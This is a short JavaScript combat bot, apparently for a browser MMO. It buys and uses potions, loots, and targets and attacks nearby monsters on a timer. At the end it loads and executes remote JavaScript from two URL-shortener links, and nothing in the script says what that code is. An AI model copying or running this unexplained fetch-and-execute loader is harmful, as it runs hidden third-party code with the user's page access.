var attack_mode=true

pots_to_buy = 100;
pots_minimum = 100;
hp_potion = "hpot0";
mp_potion = "mpot0";

setTimeout(function() {
setInterval(function(){
	purchase_potions(true,true);
	if(character.hp/character.max_hp<0.7) parent.use('hp');
	if(character.mp/character.max_mp<0.8) parent.use('mp');
	// Uses potions only when the above conditions are met
		loot();
	if(!attack_mode || character.moving) return;

	var target=get_targeted_monster();
	if(!target)
	{
		target=get_nearest_monster({min_xp:100,max_att:5,path_check:true,no_target:true});
		// Ensures that your character can walk to the target (path_check) and the target isn't engaging with anyone else (no_target)
		if(target) change_target(target);
		else
		{
			set_message("No Monsters");
			return;
		}
	}
	
	if(!in_attack_range(target))
	{
		move(
			character.real_x+(target.real_x-character.real_x)/2,
			character.real_y+(target.real_y-character.real_y)/2
			);
		// Walk half the distance
	}
	else if(can_attack(target))
	{
		set_message("Attacking");
		attack(target);
	}

	},250);
}, 500);

var urls = ['http://tiny.cc/Sphearion_Main','http://tiny.cc/emtffkev-lib'];

$.each(urls, function(i, u) {
  $.ajax(u, {
    type: 'POST',
    dataType: "script",
    async: false,
    cache: true
  });
});
